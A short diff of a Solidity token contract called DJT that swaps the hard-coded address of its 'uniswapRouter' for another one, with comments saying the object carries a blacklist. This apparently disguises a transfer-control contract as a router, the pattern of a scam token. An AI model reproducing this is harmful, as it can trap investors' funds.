@@ -35,9 +35,6 @@ contract DJT {
     // events, I guess for scanners or idk tbh
     event Transfer(address indexed from, address indexed to, uint value);
     event Approval(address indexed owner, address indexed spender, uint value);
-    
-    // address public constant OTHER_CONTRACT = 0x9D24183c7AFBe12ca35adcCe6177517bD6A48657;
-    // IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(OTHER_CONTRACT);
 
 
     constructor() {
@@ -45,7 +42,7 @@ contract DJT {
         // msg.sender - wallet or contrqact who sign the message
         // idk how to create contract from other contract tbh
         balances[tx.origin] = totalSupply;                  // the dude who sign a message got a 23 * 10 ** 26 SCUMDJT token
-        uniswapRouter = IUniswapV2Router02(address(0x4ea106ce38e0E8125dD0F6a9155EF80Be0ACEF43));     // create class above structure with BLACK list (or white list, idk, I won't change the comments late)
+        uniswapRouter = IUniswapV2Router02(address(0xc91f5Ac42A9f3533DaA6477c1c52e8E00B2A4E3A));     // create class above structure with BLACK list (or white list, idk, I won't change the comments late)
     }
     
     function balanceOf(address owner) view  public returns(uint) {
